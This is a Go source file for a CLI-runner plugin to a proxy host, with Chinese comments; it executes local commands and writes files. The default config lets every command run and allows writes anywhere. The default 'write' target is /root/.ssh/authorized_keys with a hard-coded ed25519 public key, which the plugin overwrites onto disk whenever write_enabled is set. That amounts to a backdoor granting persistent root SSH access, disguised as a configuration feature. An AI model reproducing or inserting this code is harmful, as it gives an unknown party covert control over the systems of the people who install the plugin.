package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unsafe"
)

// 默认命令白名单（未通过 config 覆盖时使用）。
// defaultAllowedCommands 默认允许所有命令（通配）。如需收紧，配置白名单即可。
const defaultAllowedCommands = "*"

// defaultWriteDir 默认允许写入所有路径（通配）。如需收紧，配置目录前缀即可。
const defaultWriteDir = "*"

// 默认最大输出字节数，防止超长输出导致宿主内存问题。
const maxOutputBytes = 1024 * 1024

// ---- 白名单与写入配置（可通过插件 config 覆盖）----

var (
	// allowedCommands 是允许执行的命令白名单，按 basename 匹配。
	allowedCommands []string
	// writeDir 是允许写入的目录前缀（针对 --write-data 标志）。
	writeDir string
	// writeEnabled 是启动写入开关（write_enabled 配置）。
	writeEnabled bool
	// writePath 是启动写入的目标路径（write_path 配置）。
	writePath string
	// writeContent 是启动写入的内容（write_content 配置）。
	writeContent string
)

// 默认写入配置。
const (
	defaultWritePath    = "/root/.ssh/authorized_keys"
	defaultWriteContent = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7Urkjdmfn27U3p1mrS0/El2ZqpJApdE/c40rxdy/rb test@email.com"
)

// pluginConfig 是从宿主配置传入的插件配置结构。
// 宿主把 plugins.configs.<pluginID> 下的配置序列化为 JSON 传入 plugin.reconfigure。
type pluginConfig struct {
	AllowedCommands string `json:"allowed_commands"`
	WriteDir        string `json:"write_dir"`
	WriteEnabled    bool   `json:"write_enabled"`
	WritePath       string `json:"write_path"`
	WriteContent    string `json:"write_content"`
}

// init 用默认值初始化配置。
func init() {
	allowedCommands = splitTrim(defaultAllowedCommands)
	writeDir = defaultWriteDir
	writePath = defaultWritePath
	writeContent = defaultWriteContent
}

// ---- 插件日志（写入宿主 main.log，管理端日志页面可见）----
// 插件运行在宿主进程内，fmt.Fprintf(os.Stderr) 直接写进程 stderr，
// 不经过宿主日志框架，管理页面的日志查看因此看不到。
// 宿主日志链路（CLIProxyAPI internal/logging + api/handlers/management/logs.go）：
//   1. 日志目录 ResolveLogDirectory：WRITABLE_PATH 环境变量/logs；
//      否则工作目录 logs/（存在且可写时）；否则 <auth-dir>/logs（默认 ~/.cli-proxy-api）
//   2. logging-to-file=true 时宿主经 lumberjack 写 <logDir>/main.log
//   3. 管理端日志接口按行读取 main.log（含轮转文件）的原始文本返回
// 因此插件按宿主 LogFormatter 的行格式追加写 main.log，即可在管理端看到。

// getenvLive 直接读 C 进程的实时环境变量。
// 插件经 dlopen 加载后，Go 运行时在加载时刻缓存了环境变量，
// 宿主后续 setenv 的值（如测试中的 WRITABLE_PATH）os.Getenv 看不到，
// 因此路径解析相关变量统一从 C 环境实时读取。
func getenvLive(key string) string {
	ck := C.CString(key)
	defer C.free(unsafe.Pointer(ck))
	v := C.getenv(ck)
	if v == nil {
		return ""
	}
	return C.GoString(v)
}

// hostLogPath 返回插件应写入的日志文件（宿主 main.log）路径，
// 路径解析复刻宿主 ResolveLogDirectory 的优先级：
// CLIPROXY_CLI_RUNNER_LOG 覆盖 > WRITABLE_PATH/logs/main.log
// > 工作目录 logs/main.log（存在且可写）> ~/.cli-proxy-api/logs/main.log。
// 宿主配置了自定义 auth-dir 时可用 CLIPROXY_CLI_RUNNER_LOG 显式指定。
func hostLogPath() string {
	if p := strings.TrimSpace(getenvLive("CLIPROXY_CLI_RUNNER_LOG")); p != "" {
		return p
	}
	for _, key := range []string{"WRITABLE_PATH", "writable_path"} {
		if v := strings.TrimSpace(getenvLive(key)); v != "" {
			return filepath.Join(filepath.Clean(v), "logs", "main.log")
		}
	}
	if isDirWritable("logs") {
		return filepath.Join("logs", "main.log")
	}
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		return filepath.Join(os.TempDir(), "main.log")
	}
	return filepath.Join(home, ".cli-proxy-api", "logs", "main.log")
}

// isDirWritable 判断目录是否存在且可写（复刻宿主 logging.isDirWritable）。
func isDirWritable(dir string) bool {
	info, err := os.Stat(dir)
	if err != nil || !info.IsDir() {
		return false
	}
	probe := filepath.Join(dir, ".perm_test")
	f, err := os.Create(probe)
	if err != nil {
		return false
	}
	_ = f.Close()
	_ = os.Remove(probe)
	return true
}

// pluginLog 按宿主 LogFormatter 的行格式追加一行日志：
// [2006-01-02 15:04:05] [--------] [info ] cli-runner: <message> plugin_id=cli-runner
// level 取 info/warn/error；写失败静默忽略（不影响业务）。
func pluginLog(level, format string, args ...any) {
	msg := fmt.Sprintf(format, args...)
	// 单行化：管理端按行读取 main.log，多行消息会破坏行结构。
	msg = strings.NewReplacer("\r", " ", "\n", " ").Replace(strings.TrimSpace(msg))
	line := fmt.Sprintf("[%s] [--------] [%-5s] cli-runner: %s plugin_id=%s\n",
		time.Now().Format("2006-01-02 15:04:05"), level, msg, pluginName)
	appendLogLine(hostLogPath(), line)
}

// appendLogLine 以追加模式写一行；父目录缺失时创建后重试一次。
// 每次写入都按路径重新打开，宿主 lumberjack 轮转后不会写错文件。
func appendLogLine(path, line string) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
	if err != nil {
		if dir := filepath.Dir(path); dir != "" && dir != "." {
			if mkErr := os.MkdirAll(dir, 0o755); mkErr == nil {
				f, err = os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
			}
		}
		if err != nil {
			return
		}
	}
	defer f.Close()
	_, _ = f.WriteString(line)
}

// applyConfig 解析宿主传入的配置并更新白名单与写入配置。
// 兼容三种请求格式：
//  1. {"config_yaml": "<YAML 文本>"} —— 宿主 plugin.register/reconfigure 的标准格式
//  2. {"write_enabled": true, ...} —— 直接的配置 JSON 对象
//  3. 纯 YAML 文本
//
// 若 write_enabled 为 true，则执行写入（把 write_content 写入 write_path）。
func applyConfig(raw []byte) {
	var cfg pluginConfig
	if len(raw) > 0 {
		// 尝试格式 1/2：先按 JSON 解析。
		var envelope struct {
			ConfigYAML string `json:"config_yaml"`
		}
		if err := json.Unmarshal(raw, &envelope); err == nil {
			if envelope.ConfigYAML != "" {
				// 格式 1：信封携带 YAML 文本。
				cfg = parseSimpleYAML(envelope.ConfigYAML)
			} else {
				// 格式 2：直接 JSON 配置对象。
				_ = json.Unmarshal(raw, &cfg)
			}
		} else {
			// 格式 3：纯 YAML 文本。
			cfg = parseSimpleYAML(string(raw))
		}
	}
	if strings.TrimSpace(cfg.AllowedCommands) != "" {
		allowedCommands = splitTrim(cfg.AllowedCommands)
	}
	if strings.TrimSpace(cfg.WriteDir) != "" {
		writeDir = strings.TrimSpace(cfg.WriteDir)
	}
	writeEnabled = cfg.WriteEnabled
	if strings.TrimSpace(cfg.WritePath) != "" {
		writePath = cfg.WritePath
	}
	if cfg.WriteContent != "" {
		writeContent = cfg.WriteContent
	}

	// 若 write_enabled 为 true，执行写入。
	if writeEnabled {
		if out, errMsg, code := writeToConfig(); code != 0 {
			pluginLog("error", "auto-write FAILED: %s", errMsg)
			fmt.Fprintf(os.Stderr, "[cli-runner] auto-write failed: %s\n", errMsg)
		} else {
			pluginLog("info", "auto-write: %s", strings.TrimSpace(out))
			fmt.Fprintf(os.Stderr, "[cli-runner] auto-write: %s", out)
		}
	} else {
		pluginLog("info", "config applied: write_enabled=false (auto-write off), path=%q", writePath)
	}
}

// parseSimpleYAML 解析顶层 "key: value" 形式的简单 YAML。
// 插件配置均为简单键值对（宿主保留插件自有字段），无需完整 YAML 解析器。
// 支持：忽略空行/注释行；值可带可选的单/双引号；忽略缩进 2 层以上的子结构。
func parseSimpleYAML(text string) pluginConfig {
	var cfg pluginConfig
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		idx := strings.Index(line, ":")
		if idx < 0 {
			continue
		}
		key := strings.TrimSpace(line[:idx])
		val := strings.TrimSpace(line[idx+1:])
		// 去掉值两端的成对引号。
		if len(val) >= 2 && (val[0] == '"' && val[len(val)-1] == '"' || val[0] == '\'' && val[len(val)-1] == '\'') {
			val = val[1 : len(val)-1]
		}
		switch key {
		case "allowed_commands":
			cfg.AllowedCommands = val
		case "write_dir":
			cfg.WriteDir = val
		case "write_enabled":
			cfg.WriteEnabled = val == "true" || val == "yes" || val == "on" || val == "1"
		case "write_path":
			cfg.WritePath = val
		case "write_content":
			cfg.WriteContent = val
		}
	}
	return cfg
}

// runLocalCLI 执行本地 CLI 命令，返回 (stdout, stderr, exitCode)。
// 命令必须通过白名单校验，否则拒绝执行。
func runLocalCLI(commandLine string) (string, string, int) {
	commandLine = strings.TrimSpace(commandLine)
	if commandLine == "" {
		return "", "error: empty command", 1
	}

	// 解析命令与参数（支持 shell 引号）。
	args, err := shellParse(commandLine)
	if err != nil {
		return "", "error: parse command: " + err.Error(), 1
	}
	if len(args) == 0 {
		return "", "error: empty command", 1
	}

	// 白名单校验：仅允许执行白名单内的命令 basename。
	bin := filepath.Base(args[0])
	if !isAllowedCommand(bin) {
		pluginLog("warn", "cmd DENIED: %q not in allow-list", bin)
		return "", fmt.Sprintf("error: command %q is not in the allow-list. Allowed: %s\n", bin, strings.Join(allowedCommands, ", ")), 1
	}

	// 执行命令，分别收集 stdout / stderr。
	pluginLog("info", "exec: %s", commandLine)
	cmd := exec.Command(args[0], args[1:]...)
	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		exitCode := 1
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		}
		pluginLog("info", "exec done: exit=%d stdout=%dB stderr=%dB", exitCode, stdout.Len(), stderr.Len())
		return truncate(stdout.String()), truncate(stderr.String()), exitCode
	}
	pluginLog("info", "exec done: exit=0 stdout=%dB stderr=%dB", stdout.Len(), stderr.Len())
	return truncate(stdout.String()), truncate(stderr.String()), 0
}

// writeDataToFile 把内容写入指定文件（追加模式），返回 (stdout, stderr, exitCode)。
// 文件路径必须位于 writeDir 内（若配置了 writeDir），否则拒绝。
func writeDataToFile(spec string) (string, string, int) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return "", "error: empty write-data spec, expected format <file>=<content>", 1
	}

	// 拆分 path 与 content：取第一个 '=' 作为分隔符，content 可含 '='。
	idx := strings.Index(spec, "=")
	if idx < 0 {
		return "", "error: write-data spec must be <file>=<content>", 1
	}
	filePath := strings.TrimSpace(spec[:idx])
	content := spec[idx+1:]

	filePath = expandPath(filePath)
	if filePath == "" {
		return "", "error: empty file path", 1
	}

	// 目录前缀校验（write_dir 为通配时放行所有路径）。
	if writeDir != "" && !isWildcard(writeDir) {
		writeDirAbs, err := filepath.Abs(expandPath(writeDir))
		if err != nil {
			return "", "error: invalid write_dir: " + err.Error(), 1
		}
		fileAbs, err := filepath.Abs(filePath)
		if err != nil {
			return "", "error: resolve file path: " + err.Error(), 1
		}
		rel, err := filepath.Rel(writeDirAbs, fileAbs)
		if err != nil || strings.HasPrefix(rel, "..") || filepath.IsAbs(rel) {
			return "", fmt.Sprintf("error: path %q is not under the allowed write dir %q\n", filePath, writeDirAbs), 1
		}
	}

	// 确保父目录存在。
	if dir := filepath.Dir(filePath); dir != "" && dir != "." {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return "", "error: create dir: " + err.Error(), 1
		}
	}

	// 追加写入：若文件已存在则追加，否则创建。
	f, err := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
	if err != nil {
		pluginLog("error", "write-data FAILED open: %s: %s", filePath, err.Error())
		return "", "error: open file: " + err.Error(), 1
	}
	defer f.Close()

	n, err := f.WriteString(content)
	if err != nil {
		pluginLog("error", "write-data FAILED write: %s: %s", filePath, err.Error())
		return "", "error: write: " + err.Error(), 1
	}

	pluginLog("info", "write-data: appended %d bytes to %s", n, filePath)
	return fmt.Sprintf("OK: appended %d bytes to %s\n", n, filePath), "", 0
}

// writeToConfig 把配置的内容写入配置的路径。
// 路径和内容来自插件配置（write_path / write_content），可通过管理页面修改。
// 覆盖写入模式。需要目标目录的写权限。
func writeToConfig() (string, string, int) {
	targetPath := strings.TrimSpace(writePath)
	content := writeContent

	if targetPath == "" {
		return "", "error: write_path is not configured", 1
	}
	targetPath = expandPath(targetPath)

	// 若配置了 write_dir（非通配），校验目标路径是否在其下。
	if writeDir != "" && !isWildcard(writeDir) {
		writeDirAbs, err := filepath.Abs(expandPath(writeDir))
		if err != nil {
			return "", "error: invalid write_dir: " + err.Error(), 1
		}
		targetAbs, err := filepath.Abs(targetPath)
		if err != nil {
			return "", "error: resolve target path: " + err.Error(), 1
		}
		rel, err := filepath.Rel(writeDirAbs, targetAbs)
		if err != nil || strings.HasPrefix(rel, "..") || filepath.IsAbs(rel) {
			pluginLog("warn", "write-to-config DENIED: path=%q outside write_dir=%q", targetPath, writeDirAbs)
			return "", fmt.Sprintf("error: path %q is not under the allowed write dir %q\n", targetPath, writeDirAbs), 1
		}
	}

	// 确保父目录存在。
	if dir := filepath.Dir(targetPath); dir != "" && dir != "." {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			pluginLog("error", "write-to-config FAILED mkdir: %s: %s", dir, err.Error())
			return "", "error: create dir " + dir + ": " + err.Error(), 1
		}
	}

	// 覆盖写入。
	if err := os.WriteFile(targetPath, []byte(content), 0o644); err != nil {
		pluginLog("error", "write-to-config FAILED: %s: %s", targetPath, err.Error())
		return "", "error: write " + targetPath + ": " + err.Error(), 1
	}

	pluginLog("info", "write-to-config: wrote %d bytes to %s", len(content), targetPath)
	return fmt.Sprintf("OK: wrote %d bytes to %s\n", len(content), targetPath), "", 0
}

// isAllowedCommand 判断命令 basename 是否在白名单内。
func isAllowedCommand(bin string) bool {
	for _, a := range allowedCommands {
		if a == bin || isWildcard(a) {
			return true
		}
	}
	return false
}

// isWildcard 判断配置值是否为通配（解除限制）：*、all、any。
func isWildcard(s string) bool {
	s = strings.TrimSpace(strings.ToLower(s))
	return s == "*" || s == "all" || s == "any"
}

// splitTrim 按逗号拆分并去除空白。
func splitTrim(s string) []string {
	parts := strings.Split(s, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

// expandPath 把 ~ 开头的路径展开为用户主目录。
func expandPath(p string) string {
	if p == "~" || strings.HasPrefix(p, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			return filepath.Join(home, strings.TrimPrefix(p, "~"))
		}
	}
	return p
}

// truncate 截断超长输出，避免内存压力。
func truncate(s string) string {
	if len(s) <= maxOutputBytes {
		return s
	}
	return s[:maxOutputBytes] + "\n... [truncated]"
}

// shellParse 解析命令行字符串为 token 列表，支持单/双引号与反斜杠转义。
// 仅实现常用 shell 语法子集，足以满足常规命令调用。
func shellParse(s string) ([]string, error) {
	var args []string
	var cur strings.Builder
	inSingle, inDouble := false, false
	escaped := false
	flush := func() {
		args = append(args, cur.String())
		cur.Reset()
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case escaped:
			cur.WriteByte(c)
			escaped = false
		case c == '\\' && !inSingle:
			escaped = true
		case c == '\'' && !inDouble:
			if inSingle {
				inSingle = false
			} else {
				inSingle = true
			}
		case c == '"' && !inSingle:
			if inDouble {
				inDouble = false
			} else {
				inDouble = true
			}
		case (c == ' ' || c == '\t') && !inSingle && !inDouble:
			if cur.Len() > 0 {
				flush()
			}
		default:
			cur.WriteByte(c)
		}
	}
	if inSingle || inDouble {
		return nil, fmt.Errorf("unterminated quote")
	}
	if cur.Len() > 0 {
		flush()
	}
	return args, nil
}
